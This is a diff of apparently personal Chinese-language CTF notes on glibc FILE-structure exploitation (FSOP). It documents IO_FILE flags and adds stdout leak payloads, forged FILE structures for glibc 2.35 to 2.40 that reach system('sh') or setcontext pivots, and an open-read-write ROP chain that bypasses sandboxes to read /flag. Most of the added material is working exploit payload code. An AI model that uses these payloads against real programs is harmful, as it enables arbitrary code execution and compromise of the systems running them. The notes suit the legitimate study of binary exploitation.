@@ -4,7 +4,81 @@
 
 ‍
 
+## IO_FILE flags
+
 ‍
+
+### **核心标志位及其作用**
+
+以下标志位定义在 `libio/libio.h`​ 中，用于控制文件流的底层行为：
+
+|标志位宏名|十六进制值|作用描述|
+| ------------| ------------| --------------------------------------------------------------------|
+|​ **​`_IO_MAGIC`​**​|​`0xFBAD0000`​|魔数，用于验证 `FILE`​ 结构体的有效性（通常结合其他标志位使用）。|
+|​ **​`_IO_USER_BUF`​**​|​`0x0001`​|用户自定义缓冲区，关闭文件时**不释放**缓冲区（由用户管理内存）。|
+|​ **​`_IO_UNBUFFERED`​**​|​`0x0002`​|无缓冲模式，每次 I/O 操作直接调用系统函数（如 `read`​/`write`​）。|
+|​ **​`_IO_NO_READS`​**​|​`0x0004`​|禁止读操作（通常用于只写模式打开的文件流）。|
+|​ **​`_IO_NO_WRITES`​**​|​`0x0008`​|禁止写操作（通常用于只读模式打开的文件流）。|
+|​ **​`_IO_EOF_SEEN`​**​|​`0x0010`​|已到达文件末尾（EOF），由 `feof()`​ 检测此标志。|
+|​ **​`_IO_ERR_SEEN`​**​|​`0x0020`​|发生了错误（如读写失败），由 `ferror()`​ 检测此标志。|
+|​ **​`_IO_DELETE_DONT_CLOSE`​**​|​`0x0040`​|关闭文件时**不调用** `close()`​（用于临时文件，关闭后自动删除）。|
+|​ **​`_IO_LINKED`​**​|​`0x0080`​|文件流被链接到全局打开文件列表（通过 `flockfile`​ 等函数管理）。|
+|​ **​`_IO_IN_BACKUP`​**​|​`0x0100`​|流处于备份状态（用于 `fropen`​/`fwopen`​ 等函数，支持备份流的恢复）。|
+|​ **​`_IO_LINE_BUF`​**​|​`0x0200`​|行缓冲模式（遇到换行符或缓冲区满时刷新，如终端输出）。|
+|​ **​`_IO_TIED_PUT_GET`​**​|​`0x0400`​|读写指针关联（读写操作共享同一位置指针，如以 `"r+"`​ 模式打开的文件）。|
+|​ **​`_IO_CURRENTLY_PUTTING`​**​|​`0x0800`​|当前正在执行写操作（影响缓冲区位置，如 `fwrite`​ 期间设置此标志）。|
+|​ **​`_IO_IS_APPENDING`​**​|​`0x1000`​|所有写入追加到文件末尾（类似 `O_APPEND`​ 标志）。|
+|​ **​`_IO_IS_FILEBUF`​**​|​`0x2000`​|表示文件流关联到普通文件（而非管道、套接字等）。|
+|​ **​`_IO_BAD_SEEN`​**​|​`0x4000`​|发生了不可恢复的错误（如底层文件描述符损坏）。|
+|​ **​`_IO_USER_LOCK`​**​|​`0x8000`​|使用用户提供的锁（而非 glibc 自动管理的锁，需配合 `flockfile`​ 使用）。|
+
+‍
+
+- ​ **​`_IO_UNBUFFERED`​**​ 无缓冲模式
+
+```c
+>>> 0xfbad2887&2 #  无缓冲模式 # 直接输出
+2
+>>> 0xfbad3484&2 # 等待缓冲区填满
+0
+```
+
+‍
+
+‍
+
+### **标志位的组合与典型场景**
+
+1. **文件打开模式与标志**
+
+    - **只读模式（**​ **​`"r"`​** ​ **）** : 设置 `_IO_NO_WRITES`​。
+    - **只写模式（**​ **​`"w"`​** ​ **或**  **​`"a"`​** ​ **）** : 设置 `_IO_NO_READS`​。
+    - **读写模式（**​ **​`"r+"`​** ​ **）** : 不设置 `_IO_NO_READS`​ 或 `_IO_NO_WRITES`​，可能设置 `_IO_TIED_PUT_GET`​。
+    - **追加模式（**​ **​`"a"`​** ​ **）** : 设置 `_IO_IS_APPENDING`​，保证写入始终在文件末尾。
+2. **缓冲模式**
+
+    - **无缓冲**: `_IO_UNBUFFERED`​（如 `stderr`​）。
+    - **行缓冲**: `_IO_LINE_BUF`​（如 `stdout`​ 关联到终端时）。
+    - **全缓冲**: 无上述标志（默认行为，关联到普通文件时）。
+3. **错误与状态管理**
+
+    - **EOF 检测**: `_IO_EOF_SEEN`​ 由 `feof()`​ 读取。
+    - **错误检测**: `_IO_ERR_SEEN`​ 由 `ferror()`​ 读取。
+    - **不可恢复错误**: `_IO_BAD_SEEN`​ 可能导致流被标记为无效。
+
+---
+
+### **标志位的操作函数**
+
+- **设置/清除标志**:
+
+  - 通过 `_flags`​ 字段直接操作（内部使用，应用程序应避免直接修改）。
+  - 标准库函数（如 `fopen`​、`fclose`​、`fflush`​）在操作过程中自动管理标志位。
+- **查询标志**:
+
+  - ​`feof(FILE*)`​: 检查 `_IO_EOF_SEEN`​。
+  - ​`ferror(FILE*)`​: 检查 `_IO_ERR_SEEN`​。
+  - ​`fileno(FILE*)`​: 获取底层文件描述符（与 `_IO_IS_FILEBUF`​ 相关）。
 
 ‍
 
@@ -51,7 +125,7 @@
 
 ‍
 
-* 参考
+- 参考
 
 > [https://faraz.faith/2020-10-13-FSOP-lazynote/](https://faraz.faith/2020-10-13-FSOP-lazynote/)
 >
@@ -85,6 +159,17 @@ payload = p64(0xfbad1800) + p64(0) * 6 + p64(x) + p64(x + 0x100) # 写的size
 	payload += p64(0) * 2
 	payload += p64(libc.sym['_IO_file_jumps'])
 ```
+
+‍
+
+```bash
+x =  _IO_2_1_stdout_
+pay = b'\x00' * 0x90 + p64(0xfbad1800) + p64(0) * 6 + p64(x) + p64(x + 0x130)
+```
+
+‍
+
+‍
 
 ## `_IO_2_1_stdout_` 泄露地址
 
@@ -355,9 +440,15 @@ pay = flat({
 
 ‍
 
+‍
+
+‍
+
+‍
+
 ## stdout 2
 
-glibc 2.39, glibc 2.36
+glibc 2.39, glibc 2.36 2.35 基本都能通
 
 ```python
 fake_IO_addr = libc.sym['_IO_2_1_stdout_']
@@ -411,9 +502,9 @@ pay = flat({
 
 ‍
 
-* 我写的大部分都是调用这个，只要保证 call 虚表的时候 call 的是 `_IO_wfile_seekoff`​
+- 我写的大部分都是调用这个，只要保证 call 虚表的时候 call 的是 `_IO_wfile_seekoff`​
 
-​![image](assets/image-20241107201823-o6pwrr6.png)​
+![image](assets/image-20241107201823-o6pwrr6.png)
 
 ‍
 
@@ -427,7 +518,7 @@ pay = flat({
 
 ‍
 
-* 执行 `system('/bin/sh');`​
+- 执行 `system('/bin/sh');`​
 
 ‍
 
@@ -504,7 +595,7 @@ io.interactive()
 
 ‍
 
-* 绕沙箱
+- 绕沙箱
 
 执行一个read 然后可以rop 了
 
@@ -558,7 +649,7 @@ io.interactive()
 
 ## libc 2.35 stderr (exit触发)(v2)
 
-* 执行 `system('  sh;');`​
+- 执行 `system('  sh;');`​
 
 ```python
 libc.address = libc_base
@@ -615,11 +706,9 @@ pay = flat({
 ```python
 fake_IO_addr = libc.sym['_IO_2_1_stdout_']
 
-
-
 pay = flat({
     0x00: '  sh;',
-    0x18: libc.sym['setcontext'] + 53,
+    0x18: libc.sym['setcontext'] + 53, # + 61
     0x20: fake_IO_addr, # 0x20 > 0x18
     0x68: fake_IO_addr,                # rdi  #read fd
     0x70: 0,     # rsi  #read buf
@@ -628,7 +717,7 @@ pay = flat({
     0x90: 0x400,     # rdx2  #read size
     0x98: 0x23,     # rdx  #read size
     0xa0: fake_IO_addr,
-    0xa8: libc.sym['setcontext'] + 87, # RCE2 ogg
+    0xa8: libc.sym['setcontext'] + 87, # RCE2 ogg # or 61+34
     0xb0: libc.sym['read'], # RCE2 ogg
     0xd8: libc.sym['_IO_wfile_jumps'] + 0x30 - 0x20,
     0xe0: fake_IO_addr,
@@ -668,9 +757,9 @@ sl(orw_rop)
 
 ‍
 
-* libc 2.35
+- libc 2.35
 
-* libc. 2.39
+- libc. 2.39
 
 ```python
 
@@ -687,7 +776,7 @@ pay = flat({
     0x90: 0x400,     # rdx2  #read size
     0x98: 0x23,     # rdx  #read size
     0xa0: fake_IO_addr,
-    0xa8: libc.sym['setcontext']+294, # RCE2 ogg
+    0xa8: libc.sym['setcontext'] + 294, # RCE2 ogg
     0xb0: libc.sym['read'], # RCE2 ogg
     0xd8: libc.sym['_IO_wfile_jumps'] + 0x30 - 0x20,
     0xe0: fake_IO_addr,
@@ -695,6 +784,38 @@ pay = flat({
 
 
 
+
+
+pause()
+
+libc.address = libc_addr
+libc_rop = ROP(libc)
+rax = libc_rop.find_gadget(['pop rax','ret'])[0]
+rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]
+rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]
+m = 0
+try:
+    rdx = libc_rop.find_gadget(['pop rdx','ret'])[0];m = 1
+except:
+    rdx = libc_rop.find_gadget(['pop rdx','pop rbx','ret'])[0]; m = 2
+syscall = libc_rop.find_gadget(['syscall','ret'])[0]
+
+orw_rop_addr = fake_IO_addr # ret to addr
+buf = orw_rop_addr + 0xa0 + m*3*8
+orw_rop  = p64(rax) + p64(2) + p64(rdi) + p64(buf) + p64(rsi) + p64(0) + p64(rdx) + p64(0)*m + p64(syscall)
+orw_rop += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx) + p64(0x100)*m + p64(libc.sym['read'])
+orw_rop += p64(rdi) + p64(1) + p64(rsi) + p64(buf) + p64(rdx) + p64(0x100)*m + p64(libc.sym['write'])
+orw_rop += b'/flag'.ljust(0x10,b'\x00')
+
+
+
+
+
+
+
+
+
+######################################################
 
 
 libc_rop = ROP(libc)
@@ -722,6 +843,90 @@ sl(orw_rop)
 
 ‍
 
+## libc2.40
+
+file
+
+‍
+
+```c
+stream = fopen("/dev/null", "a");
+
+    buf = malloc(BUF_SIZE);
+
+    fprintf(stream, buf);
+```
+
+```c
+fake_IO_addr = heap
+
+
+# _IO_wfile_seekoff+98
+# _IO_switch_to_wget_mode
+pay = flat({
+    0x00: ' ;sh;',
+    0x18: libc.sym['system'],
+    #0x20: fake_IO_addr, # 0x20 > 0x18
+    0x20: libc.sym['system']+1, # 0x20 > 0x18
+    0x68: 0,                # rdi  #read fd
+    0x70: fake_IO_addr,     # rsi  #read buf
+    0x88: fake_IO_addr + 0x8,     # rdx  #read size
+    0xa0: fake_IO_addr,
+    0xa8: libc.sym['read'], # RCE2 ogg
+    0xd8: libc.sym['_IO_wfile_jumps'] + 0x30 - 0x20,
+    0xe0: fake_IO_addr,
+    },filler=b'\x00')
+```
+
+2 
+
+```python
+libc.address = libc_base
+
+fake_IO_addr = heap
+
+
+# _IO_wfile_seekoff+98
+# _IO_switch_to_wget_mode
+pay = flat({
+    0x00: ' /bin/sh;',
+    0x18: libc.sym['system'],
+    #0x20: fake_IO_addr, # 0x20 > 0x18
+    0x20: libc.sym['_IO_2_1_stdout_'], # 0x20 > 0x18
+    0x68: 0,                # rdi  #read fd
+    0x70: fake_IO_addr,     # rsi  #read buf
+    0x88: fake_IO_addr + 0x8,     # rdx  #read size
+    0xa0: fake_IO_addr,
+    0xa8: libc.sym['read'], # RCE2 ogg
+    0xd8: libc.sym['_IO_wfile_jumps'] + 0x30 - 0x20,
+    0xe0: fake_IO_addr,
+    },filler=b'\x00')
+```
+
+‍
+
+‍
+
+## 调试断点点位
+
+‍
+
+```c
+
+
+b *setcontext+61
+
+#b *_IO_flush_all_lockp
+#libc2.35
+
+b *_IO_flush_all
+# libc2.39
+
+b *_IO_wfile_seekoff
+b *_IO_switch_to_wget_mode
+
+```
+
 ‍
 
 ‍
@@ -730,6 +935,6 @@ sl(orw_rop)
 
 ‍
 
-* litctf libc.2.39
+- litctf libc.2.39
 
 ‍
